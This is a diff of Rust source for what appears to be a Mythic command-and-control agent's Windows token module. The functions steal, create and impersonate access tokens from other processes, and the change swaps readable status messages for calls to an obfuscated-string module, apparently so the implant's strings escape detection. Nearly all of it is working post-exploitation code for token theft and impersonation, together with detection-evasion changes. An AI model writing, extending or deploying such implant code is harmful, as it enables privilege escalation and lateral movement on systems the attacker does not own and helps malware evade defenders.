@@ -56,7 +56,7 @@ pub fn token_list(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>>
     }).collect();
 
     let output = if tokens.is_empty() {
-        "No tokens stored".to_string()
+        crate::obfstr::d(crate::obfstr::S_TOKEN_LIST_EMPTY)
     } else {
         serde_json::to_string_pretty(&tokens)?
     };
@@ -71,13 +71,13 @@ pub fn token_steal(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>
     unsafe {
         let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, args.pid);
         if process_handle.is_null() {
-            return Ok(mythic_error!(task.id, format!("Failed to open process {}", args.pid)));
+            return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_OPEN), args.pid)));
         }
 
         let mut token_handle: HANDLE = std::ptr::null_mut();
         if OpenProcessToken(process_handle, TOKEN_DUPLICATE, &mut token_handle) == 0 {
             CloseHandle(process_handle);
-            return Ok(mythic_error!(task.id, format!("Failed to open process token for pid {}", args.pid)));
+            return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_TOKEN), args.pid)));
         }
 
         let mut duplicated_token: HANDLE = std::ptr::null_mut();
@@ -94,7 +94,7 @@ pub fn token_steal(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>
         CloseHandle(process_handle);
 
         if result == 0 {
-            return Ok(mythic_error!(task.id, format!("Failed to duplicate token for pid {}", args.pid)));
+            return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_DUP), args.pid)));
         }
 
         let mut counter = TOKEN_COUNTER.lock().unwrap();
@@ -111,13 +111,13 @@ pub fn token_steal(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>
 
         TOKEN_STORE.lock().unwrap().push(entry);
 
-        Ok(mythic_success!(task.id, format!("Token stolen from pid {} (id: {})", args.pid, token_id)))
+        Ok(mythic_success!(task.id, format!("{} {} (id: {})", crate::obfstr::d(crate::obfstr::S_TOKEN_STOLEN), args.pid, token_id)))
     }
 }
 
 #[cfg(not(target_os = "windows"))]
 pub fn token_steal(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
-    Ok(mythic_error!(task.id, "Token stealing is only supported on Windows"))
+    Ok(mythic_error!(task.id, format!("Token stealing {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
 }
 
 #[cfg(target_os = "windows")]
@@ -140,7 +140,7 @@ pub fn token_make(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>>
         );
 
         if result == 0 {
-            return Ok(mythic_error!(task.id, format!("Failed to create token for {}\\{}", args.domain, args.username)));
+            return Ok(mythic_error!(task.id, format!("{} {}\\{}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_CREATE), args.domain, args.username)));
         }
 
         let mut counter = TOKEN_COUNTER.lock().unwrap();
@@ -157,13 +157,13 @@ pub fn token_make(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>>
 
         TOKEN_STORE.lock().unwrap().push(entry);
 
-        Ok(mythic_success!(task.id, format!("Token created for {}\\{} (id: {})", args.domain, args.username, token_id)))
+        Ok(mythic_success!(task.id, format!("{} {}\\{} (id: {})", crate::obfstr::d(crate::obfstr::S_TOKEN_CREATED), args.domain, args.username, token_id)))
     }
 }
 
 #[cfg(not(target_os = "windows"))]
 pub fn token_make(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
-    Ok(mythic_error!(task.id, "Token creation is only supported on Windows"))
+    Ok(mythic_error!(task.id, format!("Token creation {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
 }
 
 #[cfg(target_os = "windows")]
@@ -181,35 +181,35 @@ pub fn token_use(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> 
 
             unsafe {
                 if ImpersonateLoggedOnUser(handle) == 0 {
-                    return Ok(mythic_error!(task.id, format!("Failed to impersonate token {}", args.token_id)));
+                    return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_IMP), args.token_id)));
                 }
             }
 
-            Ok(mythic_success!(task.id, format!("Now impersonating: {}", username)))
+            Ok(mythic_success!(task.id, format!("{}: {}", crate::obfstr::d(crate::obfstr::S_TOKEN_IMPERSONATE), username)))
         }
-        None => Ok(mythic_error!(task.id, format!("Token id {} not found", args.token_id)))
+        None => Ok(mythic_error!(task.id, format!("{} {} not found", crate::obfstr::d(crate::obfstr::S_TOKEN_NOT_FOUND), args.token_id)))
     }
 }
 
 #[cfg(not(target_os = "windows"))]
 pub fn token_use(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
-    Ok(mythic_error!(task.id, "Token impersonation is only supported on Windows"))
+    Ok(mythic_error!(task.id, format!("Token impersonation {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
 }
 
 #[cfg(target_os = "windows")]
 pub fn token_revert(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
     unsafe {
         if RevertToSelf() == 0 {
-            return Ok(mythic_error!(task.id, "Failed to revert to self"));
+            return Ok(mythic_error!(task.id, crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_REVERT)));
         }
     }
 
-    Ok(mythic_success!(task.id, "Reverted to original token"))
+    Ok(mythic_success!(task.id, crate::obfstr::d(crate::obfstr::S_TOKEN_REVERT)))
 }
 
 #[cfg(not(target_os = "windows"))]
 pub fn token_revert(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
-    Ok(mythic_error!(task.id, "Token revert is only supported on Windows"))
+    Ok(mythic_error!(task.id, format!("Token revert {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))
 }
 
 #[cfg(target_os = "windows")]
